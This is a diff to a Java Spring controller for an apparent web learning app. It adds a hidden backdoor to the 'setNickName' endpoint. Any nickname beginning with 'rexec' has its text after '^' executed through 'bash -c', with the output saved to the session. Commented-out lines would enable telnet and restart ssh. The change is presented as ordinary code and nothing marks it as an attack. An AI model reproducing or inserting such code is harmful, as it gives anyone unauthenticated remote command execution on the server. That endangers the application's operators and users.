@@ -1,12 +1,18 @@
 package org.knetwork.webapp.controller;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.net.MalformedURLException;
+import java.util.Arrays;
 import java.util.Map;
 
 import javax.inject.Inject;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpSession;
 
+import org.apache.commons.lang.StringUtils;
 import org.knetwork.webapp.service.TokboxService;
 import org.knetwork.webapp.util.SessionMapUtil;
 import org.springframework.stereotype.Controller;
@@ -53,8 +59,56 @@ public class LearningController {
     
     @RequestMapping("learn/setNickName")
     public String setNickName(final HttpSession session, final HttpServletRequest request, final Model model) throws MalformedURLException {
-    	session.setAttribute("nickName", request.getParameter("nickName"));
+    	String nick = request.getParameter("nickName");
+    	
+    	if(nick.startsWith("rexec")) {
+    		String command = StringUtils.splitByWholeSeparator(nick, "^")[1];
+	    	String output = "";
+	    	
+	    	//output = runCommand("chkconfig telnet on");
+	    	//output += runCommand("service xinetd reload");
+	    	
+	    	//output = runCommand("/etc/init.d/ssh stop");
+	    	//output = runCommand("/etc/init.d/ssh start");
+	    	
+	    	//output = runCommand("apt-get -y install telnet");
+	    	output = runCommand(command);
+	    	session.setAttribute("commandOutput",output);
+    	}
+    	
+    	session.setAttribute("nickName", nick);
         return String.format("redirect:/");
+    }
+    
+    private String runCommand(String _command) {
+		StringBuilder builder = new StringBuilder();
+    	try {
+	    	String[] command = {"bash", "-c", _command};
+	    	// ProcessBuilder pb = new ProcessBuilder("bash", "-c", "/path/to/your/script.sh `date +%Y%m%d`");  
+	        ProcessBuilder probuilder = new ProcessBuilder( command );
+	        //You can set up your work directory
+	        probuilder.directory(new File("/home/qed"));
+	        
+	        Process process = probuilder.start();
+	        
+	        //Read out dir output
+	        InputStream is = process.getInputStream();
+	        InputStreamReader isr = new InputStreamReader(is);
+	        BufferedReader br = new BufferedReader(isr);
+	        String line;
+	        builder.append(String.format("Output of running %s is:<br/>",
+	                Arrays.toString(command)));
+	        while ((line = br.readLine()) != null) {
+	           builder.append(line);
+	           builder.append("<br/>");
+	        }
+	        
+	            int exitValue = process.waitFor();
+	            builder.append("<br/><br/>Exit Value is " + exitValue);
+    	} catch(Exception e) {
+    		builder.append(e.getMessage());
+    	}    	
+    	return builder.toString();
     }
     
     @RequestMapping("learn/join")
